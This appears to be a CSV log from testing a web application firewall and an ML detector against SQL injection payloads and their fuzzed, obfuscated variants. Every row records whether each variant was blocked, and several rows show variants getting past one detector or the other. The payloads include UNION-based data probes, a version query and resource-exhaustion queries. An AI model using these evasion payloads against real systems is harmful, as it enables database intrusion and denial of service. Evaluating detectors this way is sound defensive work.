Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T18:26:15.220908,1  )   where 9708  =  9708,403,200,200,both_incorrect,"(SELECT 'uJ'<>'uJF') 	)  /*,F.YL*/wHEre 9708   like   (SELECT 9708)",2024-12-16T18:26:17.167262,403,403,both_correct,"(SeLEct 'uJ'!='uJF') 	)
 /**/whERE (selEcT (SElECt/**/1))   LikE   (sELEcT 'W'='W')",2024-12-16T18:26:21.355877,403,403,both_correct,"(SELeCT 'uJ'!='uJF') 
)
 /**/wHErE (sELect (SelEcT/*mk;*/ && (SeleCt/**/3136 lIKE 3136)))   LIke   (SElect 'W'='W')",2024-12-16T18:26:26.258634,403,200,waf_correct_ml_incorrect,"(seLecT 'uJ'!='uJF') 	)
 /**/WhEre (SElecT (sELecT/*:o@*/  and  (sELecT (SELECT (SELECT ':d' NOT LIKE ':dF')) like 3136)))   LIke   (sELEcT 'W'='W')",2024-12-16T18:26:32.720111,403,403,both_correct,"(SElEcT 'uJ'!='uJF') 
)
 /**/wherE (Select (sElECt/*:o@*/  aNd  (seleCt (sEleCt (sElECT/**/':d' NOT LIKE ':dF')) LIke 0x19ec<> AND 1)))   LIkE   (sElECT 'W'='W')",2024-12-16T18:26:40.972069,403,403,both_correct
2,2024-12-16T18:26:49.644167,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",403,403,403,both_correct,"-9848' union
all/**/selecT 1359,(SELECT 1),1359,1359,3047 LIkE 3047,1359,0x54f,1359,1359,1359--",2024-12-16T18:26:53.312061,403,403,both_correct,"-9848' union all/**/selecT '(' NOT LIKE '(~',(SeLect (SELeCt 1)),1359,1359,3047/**/lIKE 0xbe7,1359,0x54f,1359,1359,1359--",2024-12-16T18:26:58.869583,403,403,both_correct,"-9848' union all selecT '(' NOT LIKE '(~',(sEleCt
(SeLecT 0x1)), ANd 1,2646 not like 2647,3047/**/LikE 0xbe7,1359,0x54f,1359,1359,1359--",2024-12-16T18:27:05.778516,403,403,both_correct,"-9848' union all selecT '(' NOT LIKE '(~',(SeLEct
(SElECt 0x1)), And 1,2646 not like 2647,3047 lIKE 0xbe7,
OR 0,0x54f,(SelEcT 1359),1359,6614 IN (6613,6614,6615)--",2024-12-16T18:27:13.340881,403,403,both_correct,"-(SELECT 1)'/**/union all selecT '(' NOT LIKE '(~',(seleCt
(SeLECt 0x1)), aND 1,2646 not like 2647,3047	lIKE 0xbe7,
OR (SELECT 0),0x54f,(sELECT 1359),1359,6614 in (6613,'I'='I',6615)--",2024-12-16T18:27:22.103218,403,403,both_correct
3,2024-12-16T18:27:31.879639,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",403,403,200,waf_correct_ml_incorrect,"SEleCT LiKE  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SeLect 'n
g'!='n
g;')   )    )  	 /**/ )    )    AND    (    (   '%'   Like   '",2024-12-16T18:27:37.664463,403,200,waf_correct_ml_incorrect,"SEleCT likE  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(sElEcT 'n
g'!='n
g;')   )    )      )    )    &&    (    (   '%'   like   '",2024-12-16T18:27:45.794631,403,200,waf_correct_ml_incorrect,"SeLeCT lIke  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(sEleCT 'n
g' not like 'n
g;')   )    )  	   )    )    &&/**/   (    (   '%'   likE   '",2024-12-16T18:27:53.646919,403,200,waf_correct_ml_incorrect,"SeleCT lIke  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(seLecT 'n
g' not like 'n g;')   )    )  	 /**/ )    )    &&/**/   (    (   '%'   LIke   '",2024-12-16T18:28:02.195706,403,200,waf_correct_ml_incorrect,"SElecT LIKe  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SELecT 'n
g' not like 'n g;')   )    )    /**/ )    )     and     (    (   '%'   like   '",2024-12-16T18:28:10.629776,403,200,waf_correct_ml_incorrect
4,2024-12-16T18:28:19.260016,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",403,403,403,both_correct,"0x1'||  ( 
select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   like   5261 union all/**/SeleCT null,null,null,null,null,null--",2024-12-16T18:28:24.490733,403,403,both_correct,"0x1'||  (  select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   LIKE    AND 0x1/*{'*/union all/**/SeLECT null,null,null,null,null,null--",2024-12-16T18:28:31.738296,403,403,both_correct,"0x1'||  (  select 'dpce' frOm dual WheRE (SelEcT 'z.' LIKE 'z.')   likE 
  and 0x1/**/union all seleCT null,null,null,null,null,null--",2024-12-16T18:28:39.360937,403,403,both_correct,"0x1'||
 (  select 'dpce' frOm dual WheRE (SelEcT 'z.'/**/LIKE 'z.')   LiKE 
  AnD 0x1/**/union all sELEcT null,null,null,null,null,null--",2024-12-16T18:28:46.651382,403,200,waf_correct_ml_incorrect,"0x1'||
 (  select 'dpce' frOm dual WheRE (SelEcT 'z.'
LIKE 'z.')   liKE 
  anD 0x1/*HWE1)*/union all SELEct null,null,null,null,null,null--",2024-12-16T18:28:54.364801,403,200,waf_correct_ml_incorrect
5,2024-12-16T18:29:01.963223,ralf,200,200,200,both_correct,ralf,2024-12-16T18:29:02.296189,200,200,both_correct,ralf,2024-12-16T18:29:03.589760,200,200,both_correct,ralf,2024-12-16T18:29:04.920854,200,200,both_correct,ralf,2024-12-16T18:29:06.232172,200,200,both_correct,ralf,2024-12-16T18:29:07.535920,200,200,both_correct
6,2024-12-16T18:29:08.843310,irado,200,200,200,both_correct,irado,2024-12-16T18:29:09.210779,200,200,both_correct,irado,2024-12-16T18:29:10.582125,200,200,both_correct,irado,2024-12-16T18:29:11.962805,200,200,both_correct,irado,2024-12-16T18:29:13.336240,200,200,both_correct,irado,2024-12-16T18:29:14.723196,200,200,both_correct
7,2024-12-16T18:29:16.097062,"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",403,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt  (  7657   like    OR 0,5020  )   anD   (  (sElEcT 2346)  =	 7109 NOT/**/LIKE 7110",2024-12-16T18:29:19.469034,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt  (  0x1de9   lIKe    oR  AND 8146=8146,5020  )   ANd   (  (SeleCt 2346)
 =	 7109 NOT LikE 7110",2024-12-16T18:29:25.514410,403,200,waf_correct_ml_incorrect,"-8640  )   oR elt/**/ ( 	0x1de9   LIke    or  and (sElEct  Or 0)=8146,5020  )   anD   (  (SeleCT 2346)
  like 	 'V'<>'Va' NOT LikE 7110",2024-12-16T18:29:31.859615,403,200,waf_correct_ml_incorrect,"- AND 1  )   Or elt  ( 	0x1de9   LiKE    or  ANd (sELEcT  Or 0) like 8146,5020  )   AnD   (  (SELEcT 2346)	  LIke 	 'V'<>'Va' NOT LikE 0x1b8b=7051",2024-12-16T18:29:39.264104,200,403,waf_incorrect_ml_correct,"- anD 1  )   oR elt  ( 	0x1de9  
LikE    Or  And (seLeCt  or 0) LIkE 8487 LIKE 8487, OR 0  )   AND   (  (select 2346)	  Like 	/**/'V'<>'Va' NOT LikE 0x1b8b=0x1b8b",2024-12-16T18:29:47.188062,200,403,waf_incorrect_ml_correct
8,2024-12-16T18:29:56.106713, union all select @@version--,403,403,403,both_correct," union/**/all seLECt
@@version--",2024-12-16T18:29:57.533593,403,403,both_correct,/**/union/**/all sELeCT	@@version--,2024-12-16T18:30:00.091198,403,403,both_correct," union/*'T' NOT LIKE 'Ts'*/all
SEleCT	@@version--",2024-12-16T18:30:02.826656,403,403,both_correct, union/*'T' NOT/**/like 'Ts'*/all	seLect	@@version--,2024-12-16T18:30:06.215674,403,403,both_correct, union/**/all SeleCT	@@version--,2024-12-16T18:30:09.696344,403,403,both_correct
9,2024-12-16T18:30:12.277039,"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",403,403,403,both_correct," && 1""   )    )  	 oR 2826<>0xb0b  =    (/**/ SELeCt count  (  *  )   FROM sysusers aS sys1,sysusers aS sys2,sysusers AS sys3,sysusers aS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  --",2024-12-16T18:30:21.293379,403,403,both_correct," && 'e' NOT/*0%*/like 'e]'""   ) 	  )  	 Or  AND (SELECT 1)<>0xb0b  =    (/**/ SeLect count  (  *  )   fRoM sysusers As sys1,sysusers As sys2,sysusers as sys3,sysusers aS sys4,sysusers As sys5,sysusers As sys6,sysusers aS sys7  )  --",2024-12-16T18:30:31.817770,200,403,waf_incorrect_ml_correct,"  anD  'e' NOT/*(SELECT '*'='*')%*/LiKE 'e]'""   )    )  	 Or  And (sElecT  AND 1)<>0xb0b  =    (/**/ sELecT count  (  *  )   fROM sysusers AS sys1,sysusers aS sys2,sysusers As sys3,sysusers aS sys4,sysusers as sys5,sysusers/**/As sys6,sysusers As sys7  )  --",2024-12-16T18:30:43.707232,200,403,waf_incorrect_ml_correct,"  AnD  'e' NOT/*(SELECT '*'='*')%*/likE 'e]'""   )    )  	 oR  And (SEleCT  ANd  aNd 1 IN (5829,5830,(SELecT 5831))) not like 0xb0b  =    (/*b9L*/ SELeCt count  ( /**/*  )   FROM sysusers	As sys1,sysusers AS sys2,sysusers aS sys3,sysusers As sys4,sysusers As sys5,sysusers/**/as sys6,sysusers As sys7  )  --",2024-12-16T18:30:56.917659,200,403,waf_incorrect_ml_correct,"  AnD  'e' NOT/*(SELECT '*'='*')%*/LIKe 'e]'"" /**/ )    )  	 OR  AND (seLeCT  aNd  anD (selEcT 1590 liKE 1590) IN ((SELecT 5829),5830,(sElecT 5831))) not like 0xb0b  =    (/*b9L*/ sELect count  ( /**/*  )   from sysusers AS sys1,sysusers AS sys2,sysusers aS sys3,sysusers aS sys4,sysusers As sys5,sysusers/**/aS sys6,sysusers aS sys7  )  --",2024-12-16T18:31:12.455487,200,403,waf_incorrect_ml_correct
10,2024-12-16T18:31:29.198206,gracindo@ajuntamentbcn2-0.jp,200,200,200,both_correct,gracindo@ajuntamentbcn2-7918 NOT LIKE (SELECT 0x1).jp,2024-12-16T18:31:30.677705,200,403,waf_correct_ml_incorrect,"gracindo@ajuntamentbcn2-'`' not like/**/'`u' NOT
LIKE (SeLEcT 0x1).jp",2024-12-16T18:31:34.269419,200,200,both_correct,gracindo@ajuntamentbcn2-'`' not like '`u' NOT	LIKE (sElEcT 0x1).jp,2024-12-16T18:31:38.877414,200,200,both_correct,gracindo@ajuntamentbcn2-'`'/**/not like '`u' NOT	LIKE	(sELeCt 0x1).jp,2024-12-16T18:31:43.071493,200,200,both_correct,gracindo@ajuntamentbcn2-'`'/**/not	like/**/'`u' NOT	LIKE	(SEleCT 0x1).jp,2024-12-16T18:31:47.428631,200,200,both_correct
